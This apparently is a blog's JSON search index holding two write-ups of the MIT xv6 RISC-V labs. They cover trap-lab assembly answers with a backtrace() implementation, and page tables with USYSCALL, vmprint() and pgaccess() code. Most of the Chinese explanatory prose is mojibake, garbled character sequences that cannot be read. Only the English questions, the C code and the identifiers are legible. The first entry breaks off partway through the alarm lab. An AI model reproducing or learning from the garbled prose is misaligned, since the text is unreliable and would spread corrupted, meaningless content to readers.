[{"content":"æ‰å…¥é™·é˜± ä¸Šå›ä¹¦è¯´åˆ°ï¼Œå†…å­˜é‡Œæœ‰ä¸ªtrapframeå¾ˆæ˜¯ç¢çœ¼ã€‚è¿™ä¸ªå®éªŒå°±æ¥æ­å¼€ä»–çš„ç¥ç§˜é¢çº±ï¼Œä½ ä¼šå‘ç°trapsæ˜¯å®ç°ç³»ç»Ÿè°ƒç”¨çš„æ ¹æœ¬æœºåˆ¶ã€‚\nLab4 Traps ç®€ç­”é¢˜ï¼šRISC-V assembly è¿™é‡Œå±•ç¤ºäº†æ ·ä¾‹ç¨‹åºçš„æ±‡ç¼–call.asmï¼Œå…¶å†…å®¹ä¸ºä¸€äº›ç®€å•çš„å‡½æ•°è°ƒç”¨ï¼Œè¦æ±‚æˆ‘ä»¬å›ç­”ä¸€äº›é—®é¢˜å¢è¿›å¯¹RISC-Væ±‡ç¼–çš„ç†è§£ã€‚å†…å®¹ä¸éš¾ï¼Œå¤šçœ‹RISC-Væ‰‹å†Œ(riscv-spec.pdf (mit.edu))ï¼Œå¤šé—®gptã€‚\nWhich registers contain arguments to functions? For example, which register holds 13 in main\u0026rsquo;s call toÂ printf?\na0-a7. a2.\nWhere is the call to functionÂ fÂ in the assembly code for main? Where is the call toÂ g? (Hint: the compiler may inline functions.)\n0x26: compiler computed return value of f . 0x14: compiler inlined g to f.\nAt what address is the functionÂ printfÂ located?\n0x64a.\nWhat value is in the registerÂ raÂ just after theÂ jalrÂ toÂ printfÂ inÂ main?\n0x38.\n1 unsigned int i = 0x00646c72;printf(\u0026#34;H%x Wo%s\u0026#34;, 57616, \u0026amp;i); Run the following code. What is the output?Â The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you setÂ iÂ to in order to yield the same output? Would you need to changeÂ 57616Â to a different value?\nHE110 World. 0x726c6400. No, c code doesn\u0026rsquo;t care little-endian or not, compiler will handle it.\nIn the following code, printf(\u0026quot;x=%d y=%d\u0026quot;, 3);what is going to be printed afterÂ 'y='? (note: the answer is not a specific value.) Why does this happen?\na2. å…¸ä¸­å…¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\nLab4-1: Backtrace å®ç°backtrace()ï¼Œæ‰“å°å½“å‰å‡½æ•°å †æ ˆã€‚è¦æ±‚æ’æ¡©åˆ°sys_sleep()ç³»ç»Ÿè°ƒç”¨å¤„æ‰§è¡Œã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæ‰€è°“å‡½æ•°æ ˆå°±æ˜¯é€šè¿‡å¸§æŒ‡é’ˆfpé“¾èµ·æ¥çš„ä¸€ä¸ªæ ˆï¼Œæ¯ä¸ªå‡½æ•°è°ƒç”¨å®ä¾‹éƒ½æŒ‰å›ºå®šæ ¼å¼ç»´æŠ¤ä¸€å †å±€éƒ¨å˜é‡ï¼Œç§°ä¸ºæ ˆæ¡¢(stack frame)ï¼Œå…¶å†…å®¹åŒ…æ‹¬ï¼šè¿”å›åœ°å€ã€fpã€å¯„å­˜å™¨å€¼ã€å±€éƒ¨å˜é‡ã€‚å¸ƒå±€å¦‚å›¾ï¼š\n1 2 3 4 5 6 7 8 9 high address [ caller frame ] [ ret, fp, -\u0026gt; caller frame saved reg, local vars... ] \u0026lt;- sp [ callee frame ] low address fpæŒ‡å‘ä¸Šä¸€ä¸ªæ ˆå¸§çš„èµ·å§‹åœ°å€ï¼Œè€ŒspæŒ‡å‘å½“å‰æ ˆé¡¶ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®fpé€’å½’éå†ï¼Œæ ¹æ®fpå’Œretçš„å›ºå®šåç§»è·å–retå€¼ï¼Œå³æ‰€æ‰§è¡Œä»£ç çš„åœ°å€ã€‚å…·ä½“åˆ°å®ç°ï¼Œè¿˜éœ€è¦è§£å†³ä»¥ä¸‹é—®é¢˜ï¼š\nä»spå¦‚ä½•è·å–fpï¼Ÿgccå°†fpå­˜å‚¨åˆ°äº†s0å¯„å­˜å™¨ä¸­ã€‚å®éªŒæ‰‹å†Œæä¾›äº†è¯»å–fpçš„å†…è”æ±‡ç¼–ä»£ç ã€‚ å¦‚ä½•åˆ¤æ–­é€’å½’ç»“æŸï¼ŸæŒ‰ç†è¯´åˆ°mainå°±åº”è¯¥ç»“æŸï¼Œä½†å¹¶æ²¡æœ‰åˆ¤æ–­å‡½æ•°åçš„æ–¹æ³•ã€‚å¥½åœ¨å®éªŒæŒ‡å¯¼è¯´å †æ ˆå›ºå®šåœ¨ä¸€ä¸ªå†…å­˜é¡µä¸­ï¼Œåªéœ€è¦ç”¨Â PGROUNDDOWN(fp)å’ŒPGROUNDUP(fp)åˆ¤æ–­pageè¾¹ç•Œå³å¯ã€‚ ä»£ç é‡å¾ˆå°‘ï¼š\n1 2 3 4 5 6 7 8 void backtrace(){ printf(\u0026#34;backtrace:\\n\u0026#34;); uint64 fp = r_fp(); while (PGROUNDDOWN(fp) \u0026lt; fp \u0026amp;\u0026amp; PGROUNDUP(fp) \u0026gt; fp){ printf(\u0026#34;%p\\n\u0026#34;, *(uint64*)(fp - 0x8)); fp = *(uint64*)(fp - 0x10); } } å®éªŒæŒ‡å¯¼è¯´ç”¨addr2lineæ£€éªŒä»¥ä¸‹ï¼š æœ€å0x12æ‰¾ä¸åˆ°å¯¹åº”çš„ä»£ç ä¸€å¼€å§‹çŒœæµ‹åº”è¯¥æ˜¯ç”¨æˆ·æ€æ–‡ä»¶æ‰€ä»¥-eæ‰¾ä¸åˆ°ï¼Œä½†åæ¥å‘ç°æ˜¯æ²¡æ£€æµ‹pageçš„ä¸Šç•Œå¯¼è‡´çš„ã€‚\nLab4-2: Alarm å®ç°sigalarm(interval, handler)ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨è°ƒç”¨çš„Â nÂ ä¸ªæ—¶é—´å•ä½åï¼Œè°ƒç”¨handlerå‡½æ•°ã€‚\nè¿˜æ˜¯å…ˆä»æµ‹è¯•ä»£ç user/alarmtest.cå…¥æ‰‹ï¼Œå‘ç°åˆ†ä¸º4å…³\ntest0(); test1(); test2(); test3(); ","date":"2024-02-04T00:00:00Z","permalink":"https://lonelyuan.github.io/p/xv6-utilities/","title":"XV6 Lab - Traps"},{"content":"æ‰‹æ’•VM è™šæ‹Ÿå†…å­˜(Virtual Memory)æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒæœºåˆ¶ï¼Œè€Œé¡µè¡¨(Page Tables)æ˜¯å»ºç«‹è™šæ‹Ÿå†…å­˜çš„åŸºç¡€è®¾æ–½ã€‚æœ¬å®éªŒå­¦ä¹ xv6é¡µè¡¨çš„ç”Ÿå‘½å‘¨æœŸå¹¶å°è¯•ä¿®æ”¹ï¼Œåœ¨å®éªŒå‰å¿…é¡»è¦é˜…è¯»é…å¥—æ•™ç§‘ä¹¦ã€Šxv6: a simple, Unix-like teaching operating system (mit.edu)ã€‹ç¬¬ä¸‰ç« ï¼Œå…¶ä¸­è®²è¿°äº†VX6çš„ä¸‰çº§é¡µè¡¨æœºåˆ¶åŠå…¶å®ç°ã€‚å¦åˆ™ä½†ä»ä»£ç ä¸Šéš¾ä»¥å…¥æ‰‹ã€‚\nç†è®ºï¼šRISV-Vä¸‰çº§é¡µè¡¨ ä¸Šå›¾æ¦‚æ‹¬äº†XV6çš„åœ°å€ç¿»è¯‘è¿‡ç¨‹ã€‚ä¸‹é¢æ˜¯ä¸€äº›è¦ç‚¹ï¼š\né¦–å…ˆï¼ŒXV6ä½¿ç”¨RISC-Vçš„Sv39æ¨¡å¼ï¼Œå³åœ¨64ä½åœ°å€é•¿åº¦ä¸­ä»…ä½¿ç”¨ä½39ä½ä½œä¸ºè™šæ‹Ÿå†…å­˜ã€‚ RISC-Vä¸­è™šæ‹Ÿå†…å­˜çš„å¸ƒå±€æ–¹å¼ç”±ç‰¹æƒå¯„å­˜å™¨satp(Supervisor Address Translation and Protection)æŒ‡å®šï¼Œè¿˜æ”¯æŒSv48ï¼ŒSv57ï¼ŒSv64ç­‰æ¨¡å¼ã€‚å¸ƒå±€æ–¹å¼çš„é€‰å–é€šå¸¸æ˜¯æ€§èƒ½å’Œå¯æ‹“å±•æ€§çš„æƒè¡¡ã€‚ è¿™39ä½è™šæ‹Ÿå†…å­˜è¢«åˆ†å‰²ä¸ºä¸‰çº§é¡µè¡¨ç´¢å¼•(9+9+9)+12ä½é¡µå†…åç§»ã€‚ å› æ­¤æ•´ä¸ªé¡µè¡¨æœ€å¤šå¯åŒ…å«2^27ä¸ªé¡µè¡¨é¡¹(PTE)ï¼Œæ¯ä¸ªåˆ†çº§é¡µè¡¨é•¿2^9=512ã€‚å¤§å°ä¸º64*512=4KBï¼Œæ­£å¥½æ˜¯ä¸€ä¸ªç‰©ç†é¡µçš„é•¿åº¦ï¼Œå³ä¸€ä¸ªé¡µè¡¨å¯¹åº”ä¸€ä¸ªç‰©ç†é¡µã€‚ æ¯ä¸ªPTEé«˜10ä½ä¿ç•™ï¼Œä½10ä½å­˜çŠ¶æ€ä½ï¼Œä¸­é—´çš„44ä½å­˜é¡µå·(PPN)ï¼Œæ ¹æ®çŠ¶æ€ä½æŒ‡ç¤ºåº”è¯¥å¯»æ‰¾ä¸‹ä¸€çº§é¡µè¡¨è¿˜æ˜¯ç›´æ¥æŸ¥è¯¢ç‰©ç†å†…å­˜ã€‚ æœ€åé€šè¿‡ä¸‰çº§é¡µè¡¨çš„è·³è½¬ä»39ä½è™šæ‹Ÿå†…å­˜ç¿»è¯‘æˆ44+12=56ä½ç‰©ç†åœ°å€ã€‚ æœ€åçš„æœ€åä¸ºé¿å…æ™•å¤´è½¬å‘ï¼Œå¤ä¹ ä¸€ä¸‹åˆ†çº§é¡µè¡¨çš„å¥½å¤„ï¼šé™ä½æ•´ä¸ªé¡µè¡¨çš„ç©ºé—´å ç”¨ï¼Œé€šè¿‡TLBç¼“å­˜åŠ é€Ÿè®¿é—®ã€‚ ä»¥ä¸Šå†…å®¹åœ¨æ“ä½œç³»ç»Ÿç†è®ºè¯¾ä¸­éƒ½å¤§å·®ä¸å·®çš„è®²è§£è¿‡ï¼Œè€Œå®éªŒçš„é‡ç‚¹æ˜¯ç†è§£åœ¨XV6ä»£ç ä¸­è¿™äº›ç†è®ºå¦‚ä½•å˜æˆç°å®ã€‚\nå®ç°ï¼šä»ä¸Šç”µå¼€æœºå¼€å§‹ ç”±äºæˆ‘ä»¬çš„å®éªŒæ˜¯åŸºäºQEMUçš„ï¼Œbootingç”±QEMUå®Œæˆï¼Œå…ˆæŒ‰ä¸‹ä¸è¡¨ã€‚æ€»ä¹‹å‰é¢å¿˜äº†ï¼Œåé¢å¿˜äº†ï¼Œä¸­é—´è¦å‡†å¤‡å¥½ä¸€ä¸ªCä»£ç çš„æ ˆï¼Œä»¥æ‰§è¡Œå†…æ ¸ELFã€‚\næ‰€ä»¥ç›´æ¥è¿›å…¥å†…æ ¸cä»£ç çš„èµ·ç‚¹kernel/main.cï¼š\n1 2 3 4 5 6 7 8 9 10 11 // start() jumps here in supervisor mode on all CPUs. void main() { if(cpuid() == 0){ // ...... kinit(); // physical page allocator kvminit(); // create kernel page table kvminithart(); // turn on paging procinit(); // process table // ...... userinit(); // first user process // ...... é¦–å…ˆï¼Œkernel/kalloc.c:kinit()ç”¨äºåˆå§‹åŒ–ç‰©ç†å†…å­˜åˆ†é…å™¨ã€‚ éšåæ‰§è¡Œçš„kernel/vm.c:kvminit()åˆå§‹åŒ–å†…æ ¸é¡µè¡¨ã€‚å†…æ ¸æ€åªéœ€ç®¡ç†ä¸€ä¸ªå†…æ ¸é¡µè¡¨ï¼Œç›¸å¯¹ç®€å•ï¼Œå¤§éƒ¨åˆ†æƒ…å†µè¿›è¡Œç›´æ¥æ˜ å°„ã€‚ kernel/vm.c:kvminithart()ï¼šä¸ºäº†å¼€å¯è™šæ‹Ÿå†…å­˜ï¼Œå†…æ ¸å¿…é¡»ä¸ºCPUè®¾ç½®å¥½satpï¼ŒåŒ…æ‹¬ä¸Šæ–‡æåˆ°çš„Sv39æ¨¡å¼ä»¥åŠæ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€ã€‚ kernel/vm.c:procinit()ï¼šåˆå§‹åŒ–è¿›ç¨‹åˆ—è¡¨ï¼Œå¹¶ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…äº†å†…æ ¸å †æ ˆçš„åœ°å€ã€‚è¿™æ˜¯ä¸ºäº†è®©æ¯ä¸ªè¿›ç¨‹éƒ½èƒ½ç‹¬ç«‹çš„å‘å†…æ ¸æ€è½¬æ¢ï¼Œæˆ‘ä»¬å‘ä¸‹è¿½æº¯ï¼š 1 2 3 4 5 6 7 8 9 10 11 // initialize the proc table. void procinit(void) { struct proc *p; initlock(\u0026amp;pid_lock, \u0026#34;nextpid\u0026#34;); initlock(\u0026amp;wait_lock, \u0026#34;wait_lock\u0026#34;); for(p = proc; p \u0026lt; \u0026amp;proc[NPROC]; p++) { initlock(\u0026amp;p-\u0026gt;lock, \u0026#34;proc\u0026#34;); p-\u0026gt;state = UNUSED; p-\u0026gt;kstack = KSTACK((int) (p - proc)); // å†…æ ¸å †æ ˆ } } KSTACKå®æ¥è‡ªkernel/memlayout.hï¼Œå…¶ä¸­æ ‡è®°äº†XV6å†…å­˜å¸ƒå±€çš„å¸¸é‡ï¼š 1 2 3 4 5 6 7 8 9 10 11 // the kernel expects there to be RAM // for use by the kernel and user pages // from physical address 0x80000000 to PHYSTOP. #define KERNBASE 0x80000000L #define PHYSTOP (KERNBASE + 128*1024*1024) // map the trampoline page to the highest address, // in both user and kernel space. #define TRAMPOLINE (MAXVA - PGSIZE) // map kernel stacks beneath the trampoline, // each surrounded by invalid guard pages. #define KSTACK(p) (TRAMPOLINE - (p)*2*PGSIZE - 3*PGSIZE) å¯ä»¥çœ‹åˆ°TRAMPOLINEä½äºè™šæ‹Ÿåœ°å€æœ€é«˜ä½åœ°å€ï¼Œæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€å…±äº«çš„ä¸€ä¸ªå†…å­˜é¡µã€‚ï¼ˆè‡³äºè¿™ä¸ªé¡µçš„ä½œç”¨åç»­å®éªŒä¼šè®²ï¼‰ ç´§éšå…¶åï¼Œæ˜ å°„çš„å†…æ ¸æ ˆåŒæ—¶è¢«ä¸€äº›ä¿æŠ¤é¡µåŒ…è£¹ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æº¢å‡ºå¹²æ‰°å…¶ä»–è¿›ç¨‹ã€‚åˆ©ç”¨æƒé™æœºåˆ¶ï¼Œå½“æº¢å‡ºåˆ°ä¿æŠ¤é¡µæ—¶å†…æ ¸ä¼šä¿æŠ¤æ€§å´©æºƒã€‚ é™¤æ­¤ä¹‹å¤–è¿˜èƒ½çœ‹åˆ° QEMU æ¨¡æ‹Ÿçš„ç‰©ç†å†…å­˜åœ°å€å¼€å§‹äº 0x80000000ï¼Œåœæ­¢åˆ°0x88000000ï¼Œç§°ä¸º PHYSTOPã€‚é‚£å‰©ä¸‹é‚£ä¹ˆå¤šåœ°å€ç©ºé—´æ˜¯å¹²å˜›ç”¨çš„ï¼Ÿç­”æ¡ˆæ˜¯é¢„ç•™ç»™IOè®¾å¤‡ã€‚ç”±æ­¤å¯è§è™šæ‹Ÿå†…å­˜çš„å¦™ç”¨ï¼Œä¸è®ºä»€ä¹ˆè®¾å¤‡éƒ½èƒ½è¢«æ˜ å°„åˆ°ç»Ÿä¸€çš„åœ°å€ç©ºé—´ã€‚ å†…æ ¸æ€è™šæ‹Ÿå†…å­˜çš„å»ºç«‹åˆ°æ­¤ç»“æŸï¼Œæœ€åæ‰§è¡Œçš„userinit()å»ºç«‹äº†ç¬¬ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åºï¼Œå…¶ä¸­çš„è°ƒç”¨é“¾ä¸ºï¼š\n1 2 3 4 5 6 allocproc() -\u0026gt;proc_pagetable() -\u0026gt;uvmcreate() // åˆå§‹åŒ–ç”¨æˆ·æ€é¡µè¡¨ -\u0026gt;kalloc() mappages() -\u0026gt;walk() å‰é¢è¯´åˆ°ä¸€ä¸ªåˆ†çº§é¡µè¡¨æ­£å¥½æ˜¯ä¸€ä¸ªç‰©ç†é¡µï¼Œå› æ­¤åˆ›å»ºé¡µè¡¨çš„æœ¬è´¨ä¹Ÿå°±æ˜¯kalloc()åˆ†é…ä¸€ä¸ªç‰©ç†é¡µã€‚è€Œåç»­å‘é¡µè¡¨ä¸­æ·»åŠ æ–°é¡µçš„æ“ä½œæ˜¯ç”±walk()å®Œæˆçš„ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 pte_t * walk(pagetable_t pagetable, uint64 va, int alloc) { if(va \u0026gt;= MAXVA) panic(\u0026#34;walk\u0026#34;); for(int level = 2; level \u0026gt; 0; level--) { pte_t *pte = \u0026amp;pagetable[PX(level, va)]; if(*pte \u0026amp; PTE_V) { pagetable = (pagetable_t)PTE2PA(*pte); } else { if(!alloc || (pagetable = (pde_t*)kalloc()) == 0) return 0; memset(pagetable, 0, PGSIZE); *pte = PA2PTE(pagetable) | PTE_V; } } return \u0026amp;pagetable[PX(0, va)]; } walk()çœŸæ­£å®Œæˆäº†ä¸‰çº§åœ°å€å¯»å€çš„é€»è¾‘ï¼ŒåŒæ—¶åœ¨å¯»å€å¤±è´¥æ—¶è¿˜å¯ä»¥è¿›è¡Œæ–°é¡µçš„åˆ›å»ºï¼Œä¹Ÿå°±æ˜¯ä¸€ç§è¿è¡Œæ—¶åˆ†é…çš„ç­–ç•¥ã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬å¤§è‡´æ¢³ç†äº†è™šæ‹Ÿå†…å­˜æœºåˆ¶çš„å»ºç«‹ï¼Œvm.cä¸­è¿˜æœ‰è®¸å¤šAPIæ²¡æœ‰ä»‹ç»ï¼Œä½†è¿˜æ˜¯è®©æˆ‘ä»¬èµ¶å¿«è¿›å…¥æ­£é¢˜å§ã€‚\nlab3 PageTables Lab3-1: Speed up system calls ä¸Šä¸€ä¸ªå®éªŒä¸­æˆ‘ä»¬æ¢³ç†äº†ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨é“¾ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹‹æ‰€ä»¥è¿™ä¹ˆå¤æ‚æ˜¯å› ä¸ºæ¶‰åŠäº†å†…æ ¸æ€ä¸ç”¨æˆ·æ€çš„è½¬æ¢ã€‚ä»¥getpid()ä¸ºä¾‹ï¼Œpidæ˜¯å†…æ ¸ä¸­procç»“æ„å˜é‡çš„æˆå‘˜ï¼Œå®ƒå­˜åœ¨äºå†…æ ¸æ€é¡µè¡¨ä¸­ï¼Œç”¨æˆ·æ€ç¨‹åºæ²¡æœ‰æƒé™è¯»å–ã€‚å› æ­¤éœ€è¦ç³»ç»Ÿè°ƒç”¨getpid()åœ¨å†…æ ¸æ€ä¸­è·å–ã€‚è¿™æ˜¯ä¸€ä¸ªåªè¯»çš„éœ€æ±‚ï¼Œå´æ¯æ¬¡éƒ½éœ€è¦è¿›è¡Œå®Œæ•´çš„å†…æ ¸æ€åˆ‡æ¢ï¼Œå› æ­¤ç°ä»£æ“ä½œç³»ç»Ÿå¦‚linuxé€šå¸¸åˆ©ç”¨VMæœºåˆ¶æ¥çœç•¥è¿™ä¸€è¿‡ç¨‹ï¼Œè®©ä¸€å—å†…æ ¸æ€çš„å†…å­˜å¯ä»¥è¢«ç”¨æˆ·æ€è¯»å–ï¼ˆå½“ç„¶åªèƒ½è¯»å–ï¼‰ï¼Œä»è€Œçœä¸‹ç³»ç»Ÿè°ƒç”¨çš„å¼€é”€ã€‚\nå®éªŒæŒ‡å¼•ä¸­å·²ä¸ºæˆ‘ä»¬å®šä¹‰å¥½äº†ç›¸å…³æ•°æ®ç»“æ„ï¼š\nkernel/memlayout.hï¼šå†…å­˜å¸ƒå±€ä¸­é¢„ç•™çš„é¡µï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // User memory layout. // Address zero first: // text // original data and bss // fixed-size stack // expandable heap // ... // USYSCALL (shared with kernel) // TRAPFRAME (p-\u0026gt;trapframe, used by the trampoline) // TRAMPOLINE (the same page as in the kernel) #define TRAPFRAME (TRAMPOLINE - PGSIZE) #define USYSCALL (TRAPFRAME - PGSIZE) struct usyscall { int pid; // Process ID }; user/ulib.cï¼šç”¨æˆ·æ€è°ƒç”¨æ–¹å¼ï¼š 1 2 3 4 int ugetpid(void){ struct usyscall *u = (struct usyscall *)USYSCALL; return u-\u0026gt;pid; } å®šä¹‰æœ‰äº†æ¥ä¸‹æ¥çœ‹æ€ä¹ˆæ“ä½œã€‚å®éªŒæŒ‡å¼•åŒæ—¶æé†’æˆ‘ä»¬ä»¿ç…§trapframeæ¥å¤„ç†å†…å­˜é¡µUSYSCALLçš„ç”Ÿå‘½å‘¨æœŸã€‚é‚£ä¹ˆå°±åœ¨ä»£ç ä¸­æœç´¢ä¸€ä¸‹trapframeï¼Œä¸»è¦åœ¨proc.cï¼ŒåŒ…æ‹¬4ä¸ªå‡½æ•°ï¼š\nallocproc()ï¼šåˆå§‹åŒ–è¿›ç¨‹ï¼Œåˆ†é…ç‰©ç†å†…å­˜é¡µ proc_pagetable()ï¼šä¸ºè¿›ç¨‹åˆ†é…é¡µè¡¨ æ³¨æ„ä½¿ç”¨PTE_R | PTE_Uæƒé™ä½ï¼Œé™¤äº†å¯è¯»è¿˜è¦è®¾ç½®ç‰¹æƒçº§ä¸ºç”¨æˆ·æ€ã€‚ freeproc()ï¼šé”€æ¯è¿›ç¨‹æ•°æ®ç»“æ„ proc_freepagetable()ï¼šæ¸…ç†é¡µè¡¨ ç…§è‘«èŠ¦ç”»ç“¢å¤åˆ¶ä¸€éå³å¯ï¼Œåˆ«å¿˜äº†ä¸ºprocç»“æ„ä½“æ·»åŠ æˆå‘˜å˜é‡ã€‚\nExtra: è¿˜æœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨å¯ç”¨æ­¤æ–¹å¼åŠ é€Ÿï¼Ÿ ä¸æ¶‰åŠå†…å­˜åˆ†é…çš„åº”è¯¥éƒ½å¯ä»¥ï¼Œæ¯”å¦‚uptimeï¼Œå†…å­˜é¡µUSYSCALLè¶³å¤Ÿæ”¾å¾ˆå¤šæ•°æ®ï¼Œåªéœ€è¦æ·»åŠ èµ‹å€¼çš„é€»è¾‘å³å¯ã€‚\nLab3-2: Print a page table åœ¨vm.cä¸­å®šä¹‰å‡½æ•°void vmprint(pagetable_t pagetable) ç”¨æ¥æ‰“å°é¡µè¡¨ã€‚è¯¥å‡½æ•°æ’æ¡©åœ¨kernel/exec.c:exec()çš„æœ€åã€‚\nå®éªŒæŒ‡å¼•æˆ‘ä»¬ä»¿ç…§freewalk()æ¥é€’å½’éå†é¡µè¡¨ã€‚åªéœ€å°†å…¶ä¸­freeçš„é€»è¾‘æ”¹ä¸ºæ‰“å°çš„é€»è¾‘å³å¯ã€‚\nè¿™é‡Œç»™å‡ºä¸€ä¸ªé€’å½’ç‰ˆå®ç°ï¼Œå®é™…ä¸Šå°±ä¸‰å±‚å¾ªç¯ä¸é€’å½’ä¹Ÿå¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void vmprint(pagetable_t pagetable, int level){ if(level == 0) return; if(level == 3) printf(\u0026#34;page table %p\\n\u0026#34;, pagetable); for(int i = 0; i \u0026lt; 512; i++){ pte_t pte = pagetable[i]; if(pte \u0026amp; PTE_V){ for(int j = level; j\u0026gt;0 ; j--) printf(\u0026#34; ..\u0026#34;); printf(\u0026#34;%d: pte %p pa %p\\n\u0026#34;, i, pte, PTE2PA(pte)); if (level \u0026gt; 1) vmprint((pagetable_t)PTE2PA(pte), level-1); } } } è¿™ä¸ªé¢˜æ²¡æœ‰æ‰“åˆ†è„šæœ¬ï¼Œçœ‹ç€è¾“å‡ºå·®ä¸å¤šå°±è¡Œã€‚\nLab3-3: Detect which pages have been accessed å¤§çš„æ¥äº†ï¼Œå®ç°pgaccess()ç³»ç»Ÿè°ƒç”¨ï¼Œæ£€æµ‹è¢«è®¿é—®çš„é¡µã€‚å®éªŒæŒ‡å¼•è¯´çš„äº‘é‡Œé›¾é‡Œæˆ‘ä»¬ä¸ç®¡ï¼Œç›´æ¥çœ‹ä»è¯„åˆ†è„šæœ¬å¼€å§‹çœ‹ä»£ç ï¼šuser/pgtbltest.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void pgaccess_test(){ char *buf; unsigned int abits; printf(\u0026#34;pgaccess_test starting\\n\u0026#34;); testname = \u0026#34;pgaccess_test\u0026#34;; buf = malloc(32 * PGSIZE); if (pgaccess(buf, 32, \u0026amp;abits) \u0026lt; 0) err(\u0026#34;pgaccess failed\u0026#34;); buf[PGSIZE * 1] += 1; buf[PGSIZE * 2] += 1; buf[PGSIZE * 30] += 1; if (pgaccess(buf, 32, \u0026amp;abits) \u0026lt; 0) err(\u0026#34;pgaccess failed\u0026#34;); if (abits != ((1 \u0026lt;\u0026lt; 1) | (1 \u0026lt;\u0026lt; 2) | (1 \u0026lt;\u0026lt; 30))) err(\u0026#34;incorrect access bits set\u0026#34;); free(buf); printf(\u0026#34;pgaccess_test: OK\\n\u0026#34;); } å¯ä»¥çœ‹åˆ°ï¼Œint pgaccess(void *base, int len, void *mask);æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯æ£€æµ‹å¯¹è±¡ï¼ˆèµ·å§‹åœ°å€ï¼‰ï¼Œæ£€æµ‹é•¿åº¦ï¼ˆé¡µæ•°ï¼‰ï¼Œæ£€æµ‹ç»“æœï¼ˆä»¥æ©ç çš„æ ¼å¼ï¼‰ã€‚æ©ç å¯¹åº”ä½ç½®ç½®1è¡¨ç¤ºè¯¥é¡µé¢å·²è®¿é—®ï¼Œæ©ç ç”¨uintæ ¼å¼ï¼Œæ•…lençš„ä¸Šé™æ˜¯64ã€‚\né‚£ä¹ˆç”¨ä»€ä¹ˆæ•°æ®ç»“æ„å­˜å‚¨å·²è®¿é—®ä¿¡æ¯å‘¢ï¼Œè¿˜æ˜¯å›åˆ°æœ¬æ–‡é¦–å›¾ï¼Œå¯ä»¥çœ‹åˆ°PTEä¸­ç¬¬6ä½å°±æ˜¯ç”¨æ¥å¹²è¿™ä¸ªçš„ï¼Œä»£ç ä¸­ç”¨PTE_Aæ ‡è®°ã€‚å…¶èµ‹å€¼CPUå·²ç»å¤„ç†å¥½ï¼Œåªéœ€è¦è€ƒè™‘è¯»å–å³å¯ã€‚\nå®éªŒæŒ‡å¼•è¿˜æä¾›äº†è¿™äº›hintsï¼š\nç³»ç»Ÿè°ƒç”¨çš„æ³¨å†Œéƒ½å·²å†™å¥½ï¼Œç›´æ¥è¿›å…¥kernel/sysproc.cæ¥å®ç°sys_pgaccess()ã€‚è§£æå‚æ•°ç­‰ç›¸å…³APIè¯·å¤ä¹ Lab2ã€‚ walk(pt, va)è¾“å…¥é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€ï¼Œè¿”å›å¯¹åº”çš„æœ€åä¸€çº§PTEã€‚ æˆ‘ä»¬éœ€è¦çš„ç»“æœéœ€åœ¨å†…æ ¸æ€è®¡ç®—ï¼Œç”¨copyout()è½¬å‚¨åˆ°ç”¨æˆ·æ€ã€‚ PTE_Aæ¯æ¬¡ä½¿ç”¨å®Œå¿…é¡»æ¸…é™¤ï¼Œå¦åˆ™æ±¡æŸ“ä¸‹ä¸€æ¬¡è°ƒç”¨çš„ç»“æœã€‚ æ´»ç”¨vmprint()æ¥è°ƒè¯•ã€‚ ä»£ç é‡å…¶å®ä¸å¤šï¼Œéš¾ç‚¹åœ¨äºç†è§£å¦‚ä½•è·å–è¿ç»­è™šæ‹Ÿåœ°å€å¯¹åº”çš„å†…å­˜é¡µã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œå½“malloc()åˆ†é…äº†ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œå…¶ç‰©ç†ç‰©ç†åˆ†å¸ƒå¤§æ¦‚ç‡ä¹Ÿè¿ç»­ä½†ä¹Ÿå¯ä»¥ä¸è¿ç»­ã€‚ä¸è¿‡è¿™ä¸€åˆ‡éƒ½ç”±é¡µè¡¨å®Œæˆï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨walk()å‡½æ•°è¿™ä¸€vaåˆ°paçš„å°è£…ã€‚å› æ­¤åªéœ€è¦ä»baseå¼€å§‹éå†æ‰§è¡Œwalk()å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #define PTE_A (1L \u0026lt;\u0026lt; 6) // è§„èŒƒèµ·è§åº”åœ¨kerner/riscv.hä¸­å£°æ˜ int sys_pgaccess(void) { uint64 base; argaddr(0, \u0026amp;base); int len; argint(1, \u0026amp;len); uint64 mask; argaddr(2, \u0026amp;mask); struct proc *p = myproc(); pagetable_t pagetable = p-\u0026gt;pagetable; uint64 res = 0; for(int i = 0; i \u0026lt; len; i++){ pte_t* pte = walk(pagetable, base + PGSIZE * i, 0); if(*pte \u0026amp; PTE_A){ *pte -= PTE_A; res += 1 \u0026lt;\u0026lt; i; } } copyout(pagetable, mask, (char*)\u0026amp;res, sizeof(uint64)); return 0; } Lab3-E: Extra: Super-pages ä½¿ç”¨ super-pages æ¥å‡å°‘é¡µè¡¨ä¸­çš„ PTE æ•°é‡ã€‚ä¸€ä¸ª super-page å¤§å°4Mè€Œä¸æ˜¯4Kã€‚\nğŸ‘´æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ° RISC-V super-pages 